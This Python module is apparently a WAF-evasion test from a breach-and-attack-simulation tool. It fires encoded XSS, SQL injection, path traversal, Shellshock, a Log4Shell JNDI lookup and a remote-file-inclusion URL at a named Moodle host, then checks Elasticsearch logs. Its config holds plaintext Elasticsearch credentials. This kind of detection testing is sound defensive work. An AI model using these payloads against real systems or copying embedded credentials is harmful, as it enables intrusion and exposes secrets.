import aiohttp
import asyncio
import urllib.parse
import requests
import time
from typing import List
from datetime import datetime, timedelta, timezone
from .base import BaseAttackModule

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────

TARGET_BASE      = "https://tlsoc.nile.iitb.ac.in"   # Use domain, NOT IP (WAF blocks IP access)
MOODLE_PATH      = "/moodle/"
ELASTIC_URL      = "https://192.168.10.62:9200/fosstlsoc-logs-modsec_audit_log-*/_search"
ELASTIC_USER     = "Pixels@summersoc"
ELASTIC_PASS     = "Pixels@summersoc26"
YOUR_VPN_IP      = "10.8.0.30"                        # Your VPN IP (seen in logs as source.ip)
DELAY_BETWEEN    = 0.5                                 # Seconds between each request
PIPELINE_WAIT    = 8                                   # Seconds to wait for Kafka/Logstash ingestion

# ─────────────────────────────────────────────
# PAYLOAD LIBRARY
# Each entry: (label, payload, expected_rule_id, category)
# ─────────────────────────────────────────────

PAYLOADS = [

    # ── Category 1: Plain XSS (Baseline — should always be caught) ──
    (
        "XSS_PLAIN",
        "<script>alert('BAS_XSS')</script>",
        "941100",
        "XSS - Plain"
    ),

    # ── Category 2: URL-Encoded XSS ──
    # WAF must decode %3C%2F before matching.
    (
        "XSS_URL_ENCODED",
        "%3Cscript%3Ealert%28%27BAS_ENCODED%27%29%3C%2Fscript%3E",
        "941100",
        "XSS - URL Encoded"
    ),

    # ── Category 3: Double URL-Encoded XSS ──
    # Exploits WAFs that only decode once. Backend may decode twice.
    (
        "XSS_DOUBLE_ENCODED",
        "%253Cscript%253Ealert%2528%2527BAS_DOUBLE%2527%2529%253C%252Fscript%253E",
        "941100",
        "XSS - Double URL Encoded"
    ),

    # ── Category 4: HTML Entity Encoded XSS ──
    # Uses HTML entities; some WAFs miss these in query params.
    (
        "XSS_HTML_ENTITY",
        "&#60;script&#62;alert('BAS_ENTITY')&#60;/script&#62;",
        "941100",
        "XSS - HTML Entity Encoded"
    ),

    # ── Category 5: Alternate Tag XSS (No <script>) ──
    # Tests if WAF has coverage beyond just <script> tags.
    (
        "XSS_IMG_TAG",
        "<img src=x onerror=alert('BAS_IMG')>",
        "941110",
        "XSS - IMG Tag"
    ),

    # ── Category 6: SVG-based XSS ──
    (
        "XSS_SVG",
        "<svg onload=alert('BAS_SVG')>",
        "941110",
        "XSS - SVG Tag"
    ),

    # ── Category 7: Plain SQL Injection (Baseline) ──
    (
        "SQLI_PLAIN",
        "' OR '1'='1",
        "942100",
        "SQLi - Plain"
    ),

    # ── Category 8: URL-Encoded SQL Injection ──
    (
        "SQLI_URL_ENCODED",
        "%27%20OR%20%271%27%3D%271",
        "942100",
        "SQLi - URL Encoded"
    ),

    # ── Category 9: SQL Injection with Comment Obfuscation ──
    # Uses -- and /* */ to break keyword detection.
    (
        "SQLI_COMMENT",
        "' OR 1=1--",
        "942100",
        "SQLi - Comment Obfuscation"
    ),

    # ── Category 10: SQL UNION Attack ──
    (
        "SQLI_UNION",
        "' UNION SELECT null,null,null--",
        "942200",
        "SQLi - UNION"
    ),

    # ── Category 11: Path Traversal (Basic) ──
    (
        "PATH_TRAVERSAL_BASIC",
        "../../../../etc/passwd",
        "930100",
        "Path Traversal - Basic"
    ),

    # ── Category 12: Path Traversal URL-Encoded ──
    (
        "PATH_TRAVERSAL_ENCODED",
        "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
        "930100",
        "Path Traversal - URL Encoded"
    ),

    # ── Category 13: Path Traversal Double-Encoded ──
    (
        "PATH_TRAVERSAL_DOUBLE",
        "%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
        "930100",
        "Path Traversal - Double Encoded"
    ),

    # ── Category 14: Remote File Inclusion ──
    (
        "RFI",
        "http://evil.example.com/shell.txt?",
        "931100",
        "RFI - Remote File Inclusion"
    ),

    # ── Category 15: Log4Shell Probe (CVE-2021-44228) ──
    # Tests if ModSecurity CRS has Log4Shell coverage (Rule 932130+).
    (
        "LOG4SHELL",
        "${jndi:ldap://bas-test.example.com/exploit}",
        "932130",
        "Log4Shell - JNDI Probe"
    ),

    # ── Category 16: Shellshock Probe ──
    # Tests User-Agent based Shellshock rule (920450).
    (
        "SHELLSHOCK_HEADER",
        "() { :; }; echo BAS_SHELLSHOCK",
        "920450",
        "Shellshock - Header Injection"
    ),
]

# ─────────────────────────────────────────────
# RESULT TRACKER
# ─────────────────────────────────────────────

results = []


# ─────────────────────────────────────────────
# ATTACK EXECUTION
# ─────────────────────────────────────────────

async def send_payload(session: aiohttp.ClientSession, label: str, payload: str,
                        expected_rule: str, category: str):
    """
    Sends a single payload to the target and records the HTTP response.
    ModSecurity typically returns:
      403 Forbidden  → Payload was DETECTED and BLOCKED
      200 OK         → Payload was NOT blocked (potential bypass or no matching rule)
      302 Redirect   → Application redirected (common in Moodle login flows)
    """
    url = f"{TARGET_BASE}{MOODLE_PATH}?q={urllib.parse.quote(payload, safe='%')}"

    # For Shellshock, inject into User-Agent header instead of query param
    headers = {}
    if label == "SHELLSHOCK_HEADER":
        headers["User-Agent"] = payload
        url = f"{TARGET_BASE}{MOODLE_PATH}"

    try:
        async with session.get(url, headers=headers, allow_redirects=False,
                                ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            status = resp.status

            # Interpret result
            if status == 403:
                outcome = "BLOCKED ✓"
            elif status in (200, 302, 301):
                outcome = "NOT BLOCKED ✗ (Potential Bypass)"
            else:
                outcome = f"UNEXPECTED ({status})"

            result = {

                # ------------------------------------------------
                # REQUIRED BY AttackModuleResult / Pydantic
                # ------------------------------------------------

                "id":
                    label.lower(),

                "title":
                    f"{category} Detection",

                "description":
                    (
                        f"WAF processed payload '{label}' "
                        f"with HTTP status {status}. "
                        f"Expected CRS rule: {expected_rule}"
                    ),

                "severity":
                    (
                        "medium"
                        if status == 403
                        else "high"
                    ),

                "mitre_id":
                    "T1190",

                # ------------------------------------------------
                # EXISTING DATA
                # ------------------------------------------------

                "label":
                    label,

                "category":
                    category,

                "payload":
                    payload[:60] + (
                        "..."
                        if len(payload) > 60
                        else ""
                    ),

                "url":
                    url[:80] + (
                        "..."
                        if len(url) > 80
                        else ""
                    ),

                "http_status":
                    status,

                "outcome":
                    outcome,

                "expected_rule":
                    expected_rule,

                "blocked":
                    status == 403,

                "timestamp":
                    datetime.now(
                        timezone.utc
                    ).isoformat()
            }
            results.append(result)

            icon = "✓" if status == 403 else "✗"
            print(f"  [{icon}] {category:<40} HTTP {status} → {outcome}")

    except asyncio.TimeoutError:
        print(f"  [T] {category:<40} TIMEOUT")
        results.append({

            "id":
                f"{label.lower()}_timeout",

            "title":
                f"{category} Timeout",

            "description":
                f"Payload '{label}' timed out during execution.",

            "severity":
                "low",

            "mitre_id":
                "T1190",

            "label":
                label,

            "category":
                category,

            "payload":
                payload[:60],

            "url":
                url[:80],

            "http_status":
                "TIMEOUT",

            "outcome":
                "TIMEOUT",

            "expected_rule":
                expected_rule,

            "blocked":
                False,

            "timestamp":
                datetime.now(
                    timezone.utc
                ).isoformat()
        })

    except Exception as e:
        print(f"  [E] {category:<40} ERROR: {e}")
        results.append({

            "id":
                f"{label.lower()}_error",

            "title":
                f"{category} Error",

            "description":
                f"Execution error occurred: {e}",

            "severity":
                "medium",

            "mitre_id":
                "T1190",

            "label":
                label,

            "category":
                category,

            "payload":
                payload[:60],

            "url":
                url[:80],

            "http_status":
                "ERROR",

            "outcome":
                f"ERROR: {e}",

            "expected_rule":
                expected_rule,

            "blocked":
                False,

            "timestamp":
                datetime.now(
                    timezone.utc
                ).isoformat()
        })


async def run_evasion_attack():
    """Launches all payloads asynchronously against the target."""
    print("\n" + "="*65)
    print("  SecureForge BAS — WAF Evasion Module")
    print(f"  Target : {TARGET_BASE}{MOODLE_PATH}")
    print(f"  WAF    : ModSecurity v3.0.12 + OWASP CRS 4.15.0-dev")
    print(f"  Probes : {len(PAYLOADS)} payloads across 6 attack categories")
    print("="*65 + "\n")

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for label, payload, expected_rule, category in PAYLOADS:
            await send_payload(session, label, payload, expected_rule, category)
            await asyncio.sleep(DELAY_BETWEEN)


# ─────────────────────────────────────────────
# ELASTICSEARCH VALIDATION
# ─────────────────────────────────────────────

def validate_waf_detection():
    """
    Queries Elasticsearch to confirm ModSecurity logs were ingested
    and how many payloads were captured by the SOC pipeline.
    """
    print("\n" + "="*65)
    print("  SOC Pipeline Validation — Querying Elasticsearch")
    print("="*65)

    time_threshold = (datetime.now(timezone.utc) - timedelta(minutes=10)).isoformat()

    query = {
        "query": {
            "bool": {
                "must": [
                    {"match": {"event.module": "modsec_audit_log"}},
                    {"match": {"source.ip": YOUR_VPN_IP}}
                ],
                "filter": [
                    {"range": {"@timestamp": {"gte": time_threshold}}}
                ]
            }
        },
        "aggs": {
            "by_rule": {
                "terms": {"field": "rule.id.keyword", "size": 20}
            },
            "by_action": {
                "terms": {"field": "event.action.keyword", "size": 5}
            }
        }
    }

    try:
        resp = requests.get(
            ELASTIC_URL,
            json=query,
            auth=(ELASTIC_USER, ELASTIC_PASS),
            verify=False,
            timeout=10
        )

        if resp.status_code == 200:
            data = resp.json()
            total_hits = data["hits"]["total"]["value"]

            print(f"\n  Total WAF events logged in Elasticsearch : {total_hits}")

            # Show which rules fired
            rule_buckets = data.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
            if rule_buckets:
                print("\n  Rules Triggered (CRS Rule ID → Hit Count):")
                for bucket in rule_buckets:
                    print(f"    Rule {bucket['key']:<10} → {bucket['doc_count']} hits")

            # Show block vs allow breakdown
            action_buckets = data.get("aggregations", {}).get("by_action", {}).get("buckets", [])
            if action_buckets:
                print("\n  Action Breakdown:")
                for bucket in action_buckets:
                    print(f"    {bucket['key']:<15} → {bucket['doc_count']} events")

            if total_hits > 0:
                print(f"\n  [SUCCESS] BAS Validation Passed — SOC pipeline captured {total_hits} WAF events.")
            else:
                print("\n  [WARNING] No WAF events found. Check VPN IP, pipeline delay, or index name.")

        else:
            print(f"  [ERROR] Elasticsearch returned HTTP {resp.status_code}")

    except Exception as e:
        print(f"  [ERROR] Validation failed: {e}")


# ─────────────────────────────────────────────
# RESULTS SUMMARY
# ─────────────────────────────────────────────

def print_summary():
    """Prints a clean table of all attack results."""
    print("\n" + "="*65)
    print("  ATTACK SUMMARY")
    print("="*65)

    blocked   = [r for r in results if r["http_status"] == 403]
    bypassed  = [r for r in results if r["http_status"] in (200, 302, 301)]
    errors    = [r for r in results if r["http_status"] not in (403, 200, 302, 301)]

    print(f"\n  Total Payloads Sent  : {len(results)}")
    print(f"  Blocked by WAF  (✓) : {len(blocked)}")
    print(f"  Not Blocked     (✗) : {len(bypassed)}")
    print(f"  Errors/Timeouts     : {len(errors)}")

    if bypassed:
        print("\n  ⚠  POTENTIAL BYPASSES (Payloads NOT blocked by WAF):")
        for r in bypassed:
            print(f"    [{r['label']}] HTTP {r['http_status']} — {r['category']}")
            print(f"      Payload : {r['payload']}")
            print(f"      Expected Rule: {r['expected_rule']}")

    print("\n  Full Results:")
    print(f"  {'Category':<42} {'HTTP':<8} {'Outcome'}")
    print("  " + "-"*62)
    for r in results:
        print(f"  {r['category']:<42} {str(r['http_status']):<8} {r['outcome']}")


class WAFEvasionModule(BaseAttackModule):
    MODULE_NAME = "waf_evasion"

    async def execute(self):
        await run_evasion_attack()
        print_summary()
        import time
        time.sleep(PIPELINE_WAIT)
        validate_waf_detection()
        return results


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

if __name__ == "__main__":
    # Step 1: Run all payloads
    asyncio.run(run_evasion_attack())

    # Step 2: Print local summary
    print_summary()

    # Step 3: Wait for Kafka/Logstash pipeline ingestion
    print(f"\n  [!] Waiting {PIPELINE_WAIT}s for SOC pipeline ingestion (Kafka → Logstash → ES)...")
    time.sleep(PIPELINE_WAIT)

    # Step 4: Validate against Elasticsearch
    validate_waf_detection()

    print("\n  [DONE] WAF Evasion module complete.\n")